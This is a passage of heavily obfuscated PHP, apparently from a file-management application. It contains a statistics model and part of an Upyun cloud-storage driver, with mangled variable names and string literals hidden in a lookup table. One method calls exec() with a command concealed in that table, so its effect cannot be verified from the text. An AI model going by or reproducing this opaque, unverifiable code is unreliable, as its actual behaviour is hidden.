$ËÊ–ø¹©[10])) { $§Åõ­¯¸[$ËÊ–ø¹©[1671]] += 1; } } if ($§Åõ­¯¸[$ËÊ–ø¹©[1783]] == $ËÊ–ø¹©[1196]) { $§Åõ­¯¸[$ËÊ–ø¹©[1783]] = $ËÊ–ø¹©[313]; } $§Åõ­¯¸[$ËÊ–ø¹©[1721]] = $“Ë»ñÖ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($«‚å§Ò) { $ë²¦ˆØÓ =& $_SERVER[Îûáû“ş]; $¾åÌòÉ³ = array($ë²¦ˆØÓ[590] => array($ë²¦ˆØÓ[33] => $ë²¦ˆØÓ[1790], $ë²¦ˆØÓ[273] => array($ë²¦ˆØÓ[224], $ë²¦ˆØÓ[764], $ë²¦ˆØÓ[1791], $ë²¦ˆØÓ[1792])), $ë²¦ˆØÓ[1793] => array($ë²¦ˆØÓ[33] => $ë²¦ˆØÓ[1794], $ë²¦ˆØÓ[273] => array($ë²¦ˆØÓ[224], $ë²¦ˆØÓ[762], $ë²¦ˆØÓ[1795], $ë²¦ˆØÓ[1796], $ë²¦ˆØÓ[1797]))); if (!isset($¾åÌòÉ³[$«‚å§Ò])) { return !1; } $this->optionType = $¾åÌòÉ³[$«‚å§Ò][$ë²¦ˆØÓ[33]]; $this->field = $¾åÌòÉ³[$«‚å§Ò][$ë²¦ˆØÓ[273]]; return !0; } public function listData($ñš±â = false, $·Ïû£¦© = "\x6d\157\144\x69\146\x79\x54\151\155\145", $¶˜µÔ‰ª = false) { return parent::listData($ñš±â, $·Ïû£¦©, $¶˜µÔ‰ª); } public function trendList($Š¬ÍÕûğ) { $Õïì¾úû =& $_SERVER[Îûáû“ş]; $£Ö£›”‡ = $this->listData(); if ($£Ö£›”‡) { $ƒ¡„¾åÎ = end($£Ö£›”‡); $Î•“«œÙ = date($Õïì¾úû[1798], strtotime($Õïì¾úû[1799])); if ($ƒ¡„¾åÎ[$Õïì¾úû[224]] == $Î•“«œÙ) { return $£Ö£›”‡; } $Í å•° = strtotime($ƒ¡„¾åÎ[$Õïì¾úû[224]]); } if (!isset($Í å•°)) { $¦ñ°İ·¨ = $Š¬ÍÕûğ == $Õïì¾úû[590] ? $Õïì¾úû[525] : $Õïì¾úû[824]; $Í å•° = Model($¦ñ°İ·¨)->min($Õïì¾úû[201]); } $¤³çÄ¨° = $Õïì¾úû[1800] . ucfirst($Š¬ÍÕûğ); $úÊÔƒú• = $this->dateList($Í å•°); foreach ($úÊÔƒú• as $Î•“«œÙ) { $this->{$¤³çÄ¨°}($Î•“«œÙ); } return $this->listData(); } private function dateList($ÍÁÃŸ) { $÷€²Ò˜ß =& $_SERVER[Îûáû“ş]; $ğÎî”ú = $ÍÁÃŸ; $ËË”ÏŞÌ = strtotime($÷€²Ò˜ß[1799]); $‡’º†È = array(); while ($ğÎî”ú <= $ËË”ÏŞÌ) { $‡’º†È[] = date($÷€²Ò˜ß[1798], $ğÎî”ú); $ğÎî”ú = strtotime($÷€²Ò˜ß[1801], $ğÎî”ú); } return $‡’º†È; } public function _recordUser($ÌÚñ± = '') { $¯Ú’†™Ù =& $_SERVER[Îûáû“ş]; $½…éôì = strtotime(date($¯Ú’†™Ù[1802], strtotime($ÌÚñ±))); $Ïİ°€ñã = strtotime(date($¯Ú’†™Ù[1803], strtotime($ÌÚñ±))); $¦Ç¬¸…² = array($¯Ú’†™Ù[201] => array($¯Ú’†™Ù[1015], $Ïİ°€ñã)); $ÈŠ·Ÿ« = Model($¯Ú’†™Ù[525])->where($¦Ç¬¸…²)->count($¯Ú’†™Ù[1670]); $¦Ç¬¸…²[$¯Ú’†™Ù[201]] = array($¯Ú’†™Ù[333], array($½…éôì, $Ïİ°€ñã)); $³•ò¥Ø = Model($¯Ú’†™Ù[525])->where($¦Ç¬¸…²)->count($¯Ú’†™Ù[1670]); $¦Ç¬¸…²[$¯Ú’†™Ù[33]] = $¯Ú’†™Ù[1804]; $Ûá­˜÷Ö = Model($¯Ú’†™Ù[1805])->where($¦Ç¬¸…²)->count($¯Ú’†™Ù[1806]); $¼²ÏÛ£ã = array($¯Ú’†™Ù[224] => $ÌÚñ±, $¯Ú’†™Ù[764] => (int) $ÈŠ·Ÿ«, $¯Ú’†™Ù[1791] => (int) $³•ò¥Ø, $¯Ú’†™Ù[1792] => (int) $Ûá­˜÷Ö); return $this->insert($¼²ÏÛ£ã); } public function _recordStore($äÁÍŒ = '') { $Ïû•îê˜ =& $_SERVER[Îûáû“ş]; $ÈË£¿ŸÍ = strtotime(date($Ïû•îê˜[1803], strtotime($äÁÍŒ))); $å‡«š°† = array($Ïû•îê˜[201] => array($Ïû•îê˜[1015], $ÈË£¿ŸÍ)); $Ñ¦ß£éÈ = Model($Ïû•îê˜[471])->where($å‡«š°†)->sum($Ïû•îê˜[76]); $å‡«š°†[$Ïû•îê˜[410]] = 0; $ŠÎĞ—Á¾ = Model($Ïû•îê˜[824])->where($å‡«š°†)->sum($Ïû•îê˜[76]); $å‡«š°†[$Ïû•îê˜[411]] = 1; $Àç÷› = Model($Ïû•îê˜[824])->where($å‡«š°†)->sum($Ïû•îê˜[76]); $å‡«š°†[$Ïû•îê˜[411]] = 2; $ñ“Í›¾” = Model($Ïû•îê˜[824])->where($å‡«š°†)->sum($Ïû•îê˜[76]); $«ŞöÍ®× = array($Ïû•îê˜[224] => $äÁÍŒ, $Ïû•îê˜[762] => (int) $ŠÎĞ—Á¾, $Ïû•îê˜[1795] => (int) $Ñ¦ß£éÈ, $Ïû•îê˜[1796] => (int) $Àç÷›, $Ïû•îê˜[1797] => (int) $ñ“Í›¾”); return $this->insert($«ŞöÍ®×); } public function trend($ÌÖğ¼, $ƒìÉú®Œ) { $Ş¡ÅÂ®Ä =& $_SERVER[Îûáû“ş]; if (!$this->init($ÌÖğ¼)) { return !1; } $¥¾Å•ñ = $this->trendList($ÌÖğ¼); if ($¥¾Å•ñ && $ƒìÉú®Œ != $Ş¡ÅÂ®Ä[1643]) { $ÓçÔ¶ú = $¥¾Å•ñ[0][$Ş¡ÅÂ®Ä[224]]; $øóÑ ± = $this->validDate($ƒìÉú®Œ, $ÓçÔ¶ú); $¹ŸÆ×”à = array(); $ßèê¦•° = array_to_keyvalue($¥¾Å•ñ, $Ş¡ÅÂ®Ä[224]); foreach ($øóÑ ± as $¼Ö“…Ğ°) { if (isset($ßèê¦•°[$¼Ö“…Ğ°])) { $÷˜À¤¿ = $ßèê¦•°[$¼Ö“…Ğ°]; } else { $÷˜À¤¿ = end($¥¾Å•ñ); $÷˜À¤¿[$Ş¡ÅÂ®Ä[224]] = $¼Ö“…Ğ°; if ($ÌÖğ¼ == $Ş¡ÅÂ®Ä[590]) { $÷˜À¤¿[$Ş¡ÅÂ®Ä[1791]] = $÷˜À¤¿[$Ş¡ÅÂ®Ä[1792]] = 0; } } $¹ŸÆ×”à[] = $÷˜À¤¿; } $¥¾Å•ñ = $¹ŸÆ×”à; } $¥Ù·Šò¹ = array($Ş¡ÅÂ®Ä[590] => array($Ş¡ÅÂ®Ä[764] => LNG($Ş¡ÅÂ®Ä[1807]), $Ş¡ÅÂ®Ä[1791] => LNG($Ş¡ÅÂ®Ä[1808]), $Ş¡ÅÂ®Ä[1792] => LNG($Ş¡ÅÂ®Ä[1809])), $Ş¡ÅÂ®Ä[1793] => array($Ş¡ÅÂ®Ä[762] => LNG($Ş¡ÅÂ®Ä[1810]), $Ş¡ÅÂ®Ä[1795] => LNG($Ş¡ÅÂ®Ä[1811]), $Ş¡ÅÂ®Ä[1796] => LNG($Ş¡ÅÂ®Ä[1812]), $Ş¡ÅÂ®Ä[1797] => LNG($Ş¡ÅÂ®Ä[1813]))); $·ÁöÃä± = array($Ş¡ÅÂ®Ä[590] => $Ş¡ÅÂ®Ä[1814], $Ş¡ÅÂ®Ä[1793] => $Ş¡ÅÂ®Ä[76]); if (empty($¥¾Å•ñ)) { $¼Ö“…Ğ° = date($Ş¡ÅÂ®Ä[1798], strtotime($Ş¡ÅÂ®Ä[1799])); $‹ïô° = array($Ş¡ÅÂ®Ä[224] => $¼Ö“…Ğ°); foreach ($¥Ù·Šò¹[$ÌÖğ¼] as $Ù¦¬øŸ´ => $¿¤ğ‹Ò¦) { $‹ïô°[$Ù¦¬øŸ´] = 0; } $¥¾Å•ñ[] = $‹ïô°; } $·™ï…Ìä = array(); foreach ($¥¾Å•ñ as $¿¤ğ‹Ò¦) { if ($ÌÖğ¼ == $Ş¡ÅÂ®Ä[1793] && $¿¤ğ‹Ò¦[$Ş¡ÅÂ®Ä[1795]] > $¿¤ğ‹Ò¦[$Ş¡ÅÂ®Ä[762]]) { $¿¤ğ‹Ò¦[$Ş¡ÅÂ®Ä[1795]] = $¿¤ğ‹Ò¦[$Ş¡ÅÂ®Ä[762]]; } foreach ($¥Ù·Šò¹[$ÌÖğ¼] as $Ù¦¬øŸ´ => $…êæù§Ì) { $÷˜À¤¿ = array($Ş¡ÅÂ®Ä[224] => $¿¤ğ‹Ò¦[$Ş¡ÅÂ®Ä[224]], $Ş¡ÅÂ®Ä[1570] => $…êæù§Ì); $÷˜À¤¿[$·ÁöÃä±[$ÌÖğ¼]] = isset($¿¤ğ‹Ò¦[$Ù¦¬øŸ´]) ? $¿¤ğ‹Ò¦[$Ù¦¬øŸ´] : 0; $·™ï…Ìä[] = $÷˜À¤¿; } } return $·™ï…Ìä; } public function validDate($¼öşğ£, $ËÌß•Ş·) { $ä‘ü³·„ =& $_SERVER[Îûáû“ş]; $ñÛˆóåù = date($ä‘ü³·„[1798], strtotime($ä‘ü³·„[1799])); $…¹ú”™ = array($ñÛˆóåù); switch ($¼öşğ£) { case $ä‘ü³·„[1650]: $»§¹´°„ = mktime(0, 0, 0, date($ä‘ü³·„[1815]), date($ä‘ü³·„[1389]) - date($ä‘ü³·„[1452]) + 7 - 7, date($ä‘ü³·„[1816])); $Â¥‘µ“û = 0; do { $ß§îÕŞĞ = date($ä‘ü³·„[1798], $»§¹´°„ - 3600 * 24 * 7 * $Â¥‘µ“û); $…¹ú”™[] = $ß§îÕŞĞ; $Â¥‘µ“û++; } while ($ËÌß•Ş· < $ß§îÕŞĞ); break; case $ä‘ü³·„[1648]: $Â¥‘µ“û = 1; do { $ƒ‚ÒÛ‚± = date($ä‘ü³·„[1817], strtotime("\55\x20{$Â¥‘µ“û}\40\155\x6f\x6e\164\x68\x73")); $…¹ú”™[] = $ƒ‚ÒÛ‚±; $Â¥‘µ“û++; } while ($ËÌß•Ş· < $ƒ‚ÒÛ‚±); break; case $ä‘ü³·„[1818]: $ªÍ¼é•„ = (int) date($ä‘ü³·„[1816], strtotime($ËÌß•Ş·)); $ÀòÕŸ­ = (int) date($ä‘ü³·„[1816]); if ($ªÍ¼é•„ >= $ÀòÕŸ­) { break; } for ($ªÍ¼é•„; $ªÍ¼é•„ < $ÀòÕŸ­; $ªÍ¼é•„++) { $…¹ú”™[] = $ªÍ¼é•„ . $ä‘ü³·„[1819]; } break; default: break; } if ($ËÌß•Ş· > end($…¹ú”™)) { array_pop($…¹ú”™); } sort($…¹ú”™); return $…¹ú”™; } public function listTable($ñ±ØÚ¹) { $ÛòüÁŸ¿ = ucfirst($ñ±ØÚ¹); return Model($ÛòüÁŸ¿)->listData(); } public function option($îä“ÎË) { $ü¿âÇ°™ = $_SERVER[Îûáû“ş][1820] . ucfirst($îä“ÎË); return $this->{$ü¿âÇ°™}(); } private function optionUser() { $Â›Ç¥õ³ =& $_SERVER[Îûáû“ş]; $±¶ôÉ‹ğ = Model($Â›Ç¥õ³[525])->count($Â›Ç¥õ³[1670]); $ƒ¢ğîÛÌ = Model($Â›Ç¥õ³[525])->where($Â›Ç¥õ³[1821])->count($Â›Ç¥õ³[1670]); $´ïä”ˆê = intval($GLOBALS[$Â›Ç¥õ³[6]][$Â›Ç¥õ³[349]][$Â›Ç¥õ³[1625]]) / 3600; $³˜Î€¶‡ = strtotime("\x2d{$´ïä”ˆê}\x20\150\x6f\165\162\x73"); $ïĞê­² = strtotime(date($Â›Ç¥õ³[1802])); if ($³˜Î€¶‡ < $ïĞê­²) { $³˜Î€¶‡ = $ïĞê­²; } $†Ñà±Å´ = array($Â›Ç¥õ³[1822] => array($Â›Ç¥õ³[1016], $³˜Î€¶‡)); $ÛËÓÁÉ³ = (int) Model($Â›Ç¥õ³[525])->where($†Ñà±Å´)->count($Â›Ç¥õ³[1670]); if (!$ÛËÓÁÉ³) { $ÛËÓÁÉ³ = 1; } $†Ñà±Å´ = array($Â›Ç¥õ³[1822] => array($Â›Ç¥õ³[1016], $ïĞê­²)); $Ã±·Ó’ = Model($Â›Ç¥õ³[525])->where($†Ñà±Å´)->count($Â›Ç¥õ³[1670]); return array($Â›Ç¥õ³[757] => (int) $±¶ôÉ‹ğ, $Â›Ç¥õ³[1823] => (int) ($±¶ôÉ‹ğ - $ƒ¢ğîÛÌ), $Â›Ç¥õ³[1824] => (int) $ƒ¢ğîÛÌ, $Â›Ç¥õ³[1825] => (int) $Ã±·Ó’, $Â›Ç¥õ³[1826] => $ÛËÓÁÉ³); } private function optionFile() { $¨Ù¶å–ø =& $_SERVER[Îûáû“ş]; $ÆªüÆå™ = $this->sourceSize(); $ô ¥°É = $ÆªüÆå™[$¨Ù¶å–ø[76]]; $é€òÕÁà = $ÆªüÆå™[$¨Ù¶å–ø[1795]]; $÷¢ÏÅöü = Model($¨Ù¶å–ø[824])->where(array($¨Ù¶å–ø[410] => 0))->count($¨Ù¶å–ø[402]); $Â‚âˆùî = array($¨Ù¶å–ø[410] => 0, $¨Ù¶å–ø[201] => array($¨Ù¶å–ø[1016], strtotime(date($¨Ù¶å–ø[1802])))); $Ú•°Ù³Î = Model($¨Ù¶å–ø[824])->where($Â‚âˆùî)->sum($¨Ù¶å–ø[76]); $—à±•¡· = Model($¨Ù¶å–ø[824])->where($Â‚âˆùî)->count($¨Ù¶å–ø[402]); return array($¨Ù¶å–ø[762] => $ô ¥°É, $¨Ù¶å–ø[1795] => $é€òÕÁà, $¨Ù¶å–ø[1827] => $ô ¥°É - $é€òÕÁà, $¨Ù¶å–ø[1828] => (int) $Ú•°Ù³Î, $¨Ù¶å–ø[764] => (int) $÷¢ÏÅöü, $¨Ù¶å–ø[1829] => (int) $—à±•¡·); } private function optionAccess() { $‹ˆ„€Äœ =& $_SERVER[Îûáû“ş]; return array($‹ˆ„€Äœ[757] => $this->typeLogCnt(), $‹ˆ„€Äœ[107] => $this->typeLogCnt($‹ˆ„€Äœ[107]), $‹ˆ„€Äœ[452] => $this->typeLogCnt($‹ˆ„€Äœ[452]), $‹ˆ„€Äœ[1830] => $this->typeLogCnt($‹ˆ„€Äœ[1830]), $‹ˆ„€Äœ[1831] => $this->typeLogCnt($‹ˆ„€Äœ[1831]), $‹ˆ„€Äœ[590] => $this->typeLogCnt($‹ˆ„€Äœ[12], $‹ˆ„€Äœ[1806])); } private function typeLogCnt($ÎåÈ¹š = '', $ˆä¦•­¼ = "\x69\x64") { $â§ñËÀ‹ =& $_SERVER[Îûáû“ş]; $ŸƒÌ‰ß = array($â§ñËÀ‹[107] => array($â§ñËÀ‹[1832], $â§ñËÀ‹[1833]), $â§ñËÀ‹[452] => array($â§ñËÀ‹[1834], $â§ñËÀ‹[1835]), $â§ñËÀ‹[1830] => array($â§ñËÀ‹[1836], $â§ñËÀ‹[1837], $â§ñËÀ‹[1838]), $â§ñËÀ‹[1831] => array($â§ñËÀ‹[1839], $â§ñËÀ‹[1840]), $â§ñËÀ‹[1841] => array($â§ñËÀ‹[1842], $â§ñËÀ‹[1843], $â§ñËÀ‹[1844])); $î¾¥«è¾ = strtotime(date($â§ñËÀ‹[1802])); $á÷ÆÈ = array($â§ñËÀ‹[201] => array($â§ñËÀ‹[1016], $î¾¥«è¾)); if ($ÎåÈ¹š) { $á÷ÆÈ[$â§ñËÀ‹[33]] = array($â§ñËÀ‹[7], $ŸƒÌ‰ß[$ÎåÈ¹š]); } $ºí¹Ëú = Model($â§ñËÀ‹[1805])->where($á÷ÆÈ)->count($ˆä¦•­¼); return (int) $ºí¹Ëú; } private function optionServer() { $ÅŸ®İ¨ =& $_SERVER[Îûáû“ş]; $éÌğÌËï = $this->diskDriver(); $‹ó±¹ö´ = KodIO::defaultDriver(); $şˆıƒí¢ = array($ÅŸ®İ¨[816] => $‹ó±¹ö´[$ÅŸ®İ¨[399]]); $›³œéÂÕ = Model($ÅŸ®İ¨[471])->where($şˆıƒí¢)->sum($ÅŸ®İ¨[76]); $ô´Ÿ¦š™ = explode($ÅŸ®İ¨[53], $_SERVER[$ÅŸ®İ¨[143]]); $”»œ…¸‹ = $ô´Ÿ¦š™[0]; $ş§ø€îå = $GLOBALS[$ÅŸ®İ¨[6]][$ÅŸ®İ¨[21]]; $Ù«§ÍÙ™ = $ş§ø€îå[$ÅŸ®İ¨[978]]; if ($Ù«§ÍÙ™ == $ÅŸ®İ¨[966]) { $ò½¾À÷ = explode($ÅŸ®İ¨[1281], $ş§ø€îå[$ÅŸ®İ¨[977]]); $Ù«§ÍÙ™ = $ò½¾À÷[0]; } if ($Ù«§ÍÙ™ == $ÅŸ®İ¨[914] || $Ù«§ÍÙ™ == $ÅŸ®İ¨[803]) { $î¤ùƒ»‚ = Model()->db()->query($ÅŸ®İ¨[1845]); $Œ’¾ªÈº = $î¤ùƒ»‚[0] && isset($î¤ùƒ»‚[0][$ÅŸ®İ¨[1569]]) ? $î¤ùƒ»‚[0][$ÅŸ®İ¨[1569]] : 0; $Ù«§ÍÙ™ = $ÅŸ®İ¨[1846] . ($Œ’¾ªÈº ? $ÅŸ®İ¨[8] . $Œ’¾ªÈº : $ÅŸ®İ¨[12]); } $üèÅ‡¦Ğ = $GLOBALS[$ÅŸ®İ¨[6]][$ÅŸ®İ¨[349]][$ÅŸ®İ¨[826]]; return array($ÅŸ®İ¨[1847] => $éÌğÌËï ? $éÌğÌËï[$ÅŸ®İ¨[1848]] : 0, $ÅŸ®İ¨[1849] => $éÌğÌËï ? $éÌğÌËï[$ÅŸ®İ¨[1850]] : 0, $ÅŸ®İ¨[1851] => (int) $‹ó±¹ö´[$ÅŸ®İ¨[1848]] * 1024 * 1024 * 1024, $ÅŸ®İ¨[1852] => (int) $›³œéÂÕ, $ÅŸ®İ¨[1853] => ucfirst($”»œ…¸‹), $ÅŸ®İ¨[1854] => $ÅŸ®İ¨[1855] . PHP_VERSION, $ÅŸ®İ¨[1856] => phpBuild64() ? 64 : 32, $ÅŸ®İ¨[756] => str_replace($ÅŸ®İ¨[1132], $ÅŸ®İ¨[994], $Ù«§ÍÙ™), $ÅŸ®İ¨[349] => ucfirst($üèÅ‡¦Ğ), $ÅŸ®İ¨[32] => $_SERVER[$ÅŸ®İ¨[1857]]); } private function diskDriver() { $¹ôƒ•ƒÌ =& $_SERVER[Îûáû“ş]; $Á¹‰¯ò÷ = $¹ôƒ•ƒÌ[8]; $ÕŠ–ŞÚ¸ = $GLOBALS[$¹ôƒ•ƒÌ[6]][$¹ôƒ•ƒÌ[1298]] == $¹ôƒ•ƒÌ[1299]; if ($ÕŠ–ŞÚ¸) { $Á¹‰¯ò÷ = $¹ôƒ•ƒÌ[1858]; if (function_exists($¹ôƒ•ƒÌ[1859])) { exec($¹ôƒ•ƒÌ[1860], $© ÁŞµÄ); $Á¹‰¯ò÷ = $© ÁŞµÄ[1] . $¹ôƒ•ƒÌ[8]; } } if (!file_exists($Á¹‰¯ò÷)) { return; } $â¶ÔƒŸê = @disk_total_space($Á¹‰¯ò÷); $ª‘œ¸‡ = $â¶ÔƒŸê - @disk_free_space($Á¹‰¯ò÷); return array($¹ôƒ•ƒÌ[1848] => $â¶ÔƒŸê, $¹ôƒ•ƒÌ[1850] => $ª‘œ¸‡); } public function fileChart($Ö´û›ı) { $ëÈ›ÃŸ =& $_SERVER[Îûáû“ş]; if (isset($Ö´û›ı[$ëÈ›ÃŸ[1670]])) { return Model($ëÈ›ÃŸ[824])->userFileTypeProfile($Ö´û›ı[$ëÈ›ÃŸ[1670]]); } if (isset($Ö´û›ı[$ëÈ›ÃŸ[1861]])) { return Model($ëÈ›ÃŸ[824])->groupFileTypeProfile($Ö´û›ı[$ëÈ›ÃŸ[1861]]); } $İ ¶Øşå = $this->sourceSize(); $§¡ÄùáÒ = array($ëÈ›ÃŸ[432] => 0, $ëÈ›ÃŸ[411] => 1); $Æ”ÙÃ = Model($ëÈ›ÃŸ[824])->where($§¡ÄùáÒ)->sum($ëÈ›ÃŸ[76]); $§¡ÄùáÒ[$ëÈ›ÃŸ[411]] = 2; $…•ä”ï = Model($ëÈ›ÃŸ[824])->where($§¡ÄùáÒ)->sum($ëÈ›ÃŸ[76]); return array($ëÈ›ÃŸ[762] => $İ ¶Øşå[$ëÈ›ÃŸ[76]], $ëÈ›ÃŸ[1795] => $İ ¶Øşå[$ëÈ›ÃŸ[1795]], $ëÈ›ÃŸ[1796] => (int) $Æ”ÙÃ, $ëÈ›ÃŸ[1797] => (int) $…•ä”ï); } private function sourceSize() { $£Æ¸úÎÑ =& $_SERVER[Îûáû“ş]; $éŞ“û°Ó = Model($£Æ¸úÎÑ[824])->where(array($£Æ¸úÎÑ[410] => 0))->sum($£Æ¸úÎÑ[76]); $È¬™¸›ª = Model($£Æ¸úÎÑ[471])->sum($£Æ¸úÎÑ[76]); if ($È¬™¸›ª > $éŞ“û°Ó) { $È¬™¸›ª = $éŞ“û°Ó; } return array($£Æ¸úÎÑ[76] => (int) $éŞ“û°Ó, $£Æ¸úÎÑ[1795] => (int) $È¬™¸›ª); } } goto AÔ³¹³ë¡É; a·ÉİçËƒ²: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\57\x2f\x76\60\56\141\x70\151\56\165\x70\171\165\156\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($§¦úàñ‡) { parent::__construct(); $this->_init($§¦úàñ‡); } public function _init($ğ†’‹—‹) { $­ƒ¬ŠÚ =& $_SERVER[Îûáû“ş]; foreach ($ğ†’‹—‹ as $Ë•”Úş => $€ŸòçåÔ) { if (isset($this->{$Ë•”Úş})) { $this->{$Ë•”Úş} = $€ŸòçåÔ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($­ƒ¬ŠÚ[1467] . LNG($­ƒ¬ŠÚ[1398])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Í³””ìİ, $Û‡µÄ„ß = "\107\105\x54") { $ÏÇ¤ÑŠÆ =& $_SERVER[Îûáû“ş]; $Ë…ú¾©Ï = gmdate($ÏÇ¤ÑŠÆ[1431]); $—üÜàğ° = base64_encode(hash_hmac($ÏÇ¤ÑŠÆ[1468], "{$Û‡µÄ„ß}\46{$Í³””ìİ}\x26{$Ë…ú¾©Ï}", md5("{$this->userpass}"), !0)); $‚—ÉÊ… = array("\x41\165\x74\150\x6f\x72\x69\x7a\141\x74\x69\157\x6e\x3a\x55\x50\131\x55\x4e\40{$this->username}\72{$—üÜàğ°}", "\104\141\x74\x65\x3a{$Ë…ú¾©Ï}"); return $‚—ÉÊ…; } public function ussRequest($˜ì‚ØÖ, $íÃğ¹» = "\x47\105\x54", $¿øõ¼’ = false, $ª¨Å´ØÇ = false, $²ã‚¦¸ˆ = false) { $¤¶£ŞË§ =& $_SERVER[Îûáû“ş]; $˜ì‚ØÖ = trim($˜ì‚ØÖ, $¤¶£ŞË§[8]); $øªûùÜˆ = "\57{$this->bucket}\x2f{$˜ì‚ØÖ}"; $š‰–ÂÀ = $this->ussHeaders($øªûùÜˆ, $íÃğ¹»); if ($ª¨Å´ØÇ) { $š‰–ÂÀ = array_merge($š‰–ÂÀ, $ª¨Å´ØÇ); } $³¦æ¾ = url_request($this->endpoint . $øªûùÜˆ, $íÃğ¹», $¿øõ¼’, $š‰–ÂÀ, $²ã‚¦¸ˆ); if (!$³¦æ¾) { return array($¤¶£ŞË§[1214] => !1, $¤¶£ŞË§[1204] => $¤¶£ŞË§[1469]); } if (strtolower($íÃğ¹») == $¤¶£ŞË§[197] || in_array($³¦æ¾[$¤¶£ŞË§[1214]], array($¤¶£ŞË§[1324], $¤¶£ŞË§[1470]))) { $¿øõ¼’ = $³¦æ¾[$¤¶£ŞË§[1471]]; } else { $¿øõ¼’ = json_decode($³¦æ¾[$¤¶£ŞË§[1204]], !0); if (!$¿øõ¼’) { $¿øõ¼’ = $³¦æ¾[$¤¶£ŞË§[1204]]; } else { if (!$³¦æ¾[$¤¶£ŞË§[748]] && isset($¿øõ¼’[$¤¶£ŞË§[1472]])) { $¿øõ¼’ = $¿øõ¼’[$¤¶£ŞË§[1472]]; } } } return array($¤¶£ŞË§[1214] => $³¦æ¾[$¤¶£ŞË§[748]], $¤¶£ŞË§[1204] => $¿øõ¼’); } public function mkfile($¤ÁÈ¬’, $Œñè§£Ò = '', $ÙÄ›š…É = REPEAT_RENAME) { if ($this->setContent($¤ÁÈ¬’, $Œñè§£Ò)) { return $this->getPathOuter($¤ÁÈ¬’); } return !1; } public function mkdir($×‹ÁŠ, $Â›‚öş¬ = REPEAT_SKIP) { $Íêã¿ğÏ =& $_SERVER[Îûáû“ş]; $ş«Öı™ï = trim($×‹ÁŠ, $Íêã¿ğÏ[8]); if ($this->_isFolder($ş«Öı™ï)) { return $this->getPathOuter($ş«Öı™ï); } $Å§÷éœá = array($Íêã¿ğÏ[1473]); $Ê§ôá€­ = $this->ussRequest($ş«Öı™ï, $Íêã¿ğÏ[226], !1, $Å§÷éœá); return $Ê§ôá€­[$Íêã¿ğÏ[1214]] ? $this->getPathOuter($ş«Öı™ï) : !1; } public function copyFile($¦÷¦Ãâğ, $Øî³Ş) { $«‚Ò·² =& $_SERVER[Îûáû“ş]; $¾»Ì«“  = array($«‚Ò·²[1474] . "\x2f{$this->bucket}\x2f{$¦÷¦Ãâğ}", $«‚Ò·²[1475]); $îÕÂ¯ßİ = $this->ussRequest($Øî³Ş, $«‚Ò·²[228], !1, $¾»Ì«“ ); return $îÕÂ¯ßİ[$«‚Ò·²[1214]] ? !0 : $this->getPathOuter($Øî³Ş); } public function moveFile($…Ùº±î, $á©Å¯Ø) { $¶ùßƒ·› =& $_SERVER[Îûáû“ş]; $¯ÆÛÊ¼ç = array($¶ùßƒ·›[1476] . "\57{$this->bucket}\57{$…Ùº±î}", $¶ùßƒ·›[1475]); $†ùğöè› = $this->ussRequest($á©Å¯Ø, $¶ùßƒ·›[228], !1, $¯ÆÛÊ¼ç); return $†ùğöè›[$¶ùßƒ·›[1214]] ? !0 : $this->getPathOuter($á©Å¯Ø); } public function delFile($–“éÖŒß) { $œ‹·’ =& $_SERVER[Îûáû“ş]; $à÷™µ«· = $this->ussRequest($–“éÖŒß, $œ‹·’[1477]); return $à÷™µ«·[$œ‹·’[1214]] ? !0 : !1; } public function delFolder($ŠìúÚÅØ) { $ë«ÁÊ¶ı =& $_SERVER[Îûáû“ş]; if (!$this->exist($ŠìúÚÅØ)) { return !0; } $this->listItemCache = !1; $ªŠó§À„ = $®š‹ÔÇ– = array(); $this->fileList($ŠìúÚÅØ, $ªŠó§À„, $®š‹ÔÇ–, !0); $this->listItemCache = !0; foreach ($®š‹ÔÇ– as $±ß™“¼) { $Æî×ĞÜ = $this->ussRequest($±ß™“¼[$ë«ÁÊ¶ı[32]], $ë«ÁÊ¶ı[1477]); if (!$Æî×ĞÜ[$ë«ÁÊ¶ı[1214]]) { return !1; } } foreach ($ªŠó§À„ as $Ãú²²µó) { $Æî×ĞÜ = $this->ussRequest($Ãú²²µó, $ë«ÁÊ¶ı[1477]); if (!$Æî×ĞÜ[$ë«ÁÊ¶ı[1214]]) { return !1; } } $Æî×ĞÜ = $this->ussRequest($ŠìúÚÅØ, $ë«ÁÊ¶ı[1477]); return $Æî×ĞÜ[$ë«ÁÊ¶ı[1214]]; } public function rename($ĞÚå±¡Ó, $Â¦çô Â) { if ($this->isFile($ĞÚå±¡Ó)) { $Â¦çô Â = get_path_father($ĞÚå±¡Ó) . $Â¦çô Â; return $this->moveFile($ĞÚå±¡Ó, $Â¦çô Â); } return $this->renameObject($ĞÚå±¡Ó, $Â¦çô Â); } public function fileInfo($ñŸÈ¦Ä, $æ™ÖŸÄá = false, $‰…ïñ = array()) { $¨Ì®•ÖŞ =& $_SERVER[Îûáû“ş]; $ÜõçíïÛ = array($¨Ì®•ÖŞ[32] => $this->pathThis($ñŸÈ¦Ä), $¨Ì®•ÖŞ[84] => $this->getPathOuter($¨Ì®•ÖŞ[8] . $ñŸÈ¦Ä), $¨Ì®•ÖŞ[33] => $¨Ì®•ÖŞ[200], $¨Ì®•ÖŞ[76] => isset($‰…ïñ[$¨Ì®•ÖŞ[76]]) ? $‰…ïñ[$¨Ì®•ÖŞ[76]] : 0, $¨Ì®•ÖŞ[174] => $this->ext($ñŸÈ¦Ä)); if ($æ™ÖŸÄá) { return $ÜõçíïÛ; } $ÜõçíïÛ[$¨Ì®•ÖŞ[201]] = $ÜõçíïÛ[$¨Ì®•ÖŞ[85]] = 0; $ÜõçíïÛ[$¨Ì®•ÖŞ[202]] = $ÜõçíïÛ[$¨Ì®•ÖŞ[203]] = !0; if (empty($‰…ïñ)) { $‰…ïñ = $this->objectMeta($ñŸÈ¦Ä); if (!$‰…ïñ) { return $ÜõçíïÛ; } } $ÜõçíïÛ[$¨Ì®•ÖŞ[201]] = intval($‰…ïñ[$¨Ì®•ÖŞ[1478]]); $ÜõçíïÛ[$¨Ì®•ÖŞ[85]] = intval($‰…ïñ[$¨Ì®•ÖŞ[1479]]); 